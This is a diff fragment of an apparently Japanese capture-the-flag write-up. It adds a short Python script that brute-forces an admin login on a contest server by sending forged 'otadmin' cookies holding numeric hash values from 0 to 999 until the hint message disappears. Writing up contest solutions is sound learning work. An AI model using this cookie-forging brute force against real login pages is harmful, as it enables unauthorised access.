@@ -64,3 +64,15 @@ I CAN EVEN GIVE YOU A HINT XD 0006464640640064000646464640006400640640646400
 
 * 上記の結果から、最初の三桁は0～9の数字であることが分かるので、以下のようなコードで0～1000まで確かめてやればよい
 
+```
+import requests
+
+url = 'https://gameserver.zajebistyc.tf/admin/login.php'
+s = requests.Session()
+for i in range(1000):
+    r = s.get(url, cookies={'otadmin': '{"hash": ' + str(i) + '}'})
+    if 'HINT' not in str(r.content):
+        print(str(r.content))
+        break
+```
+
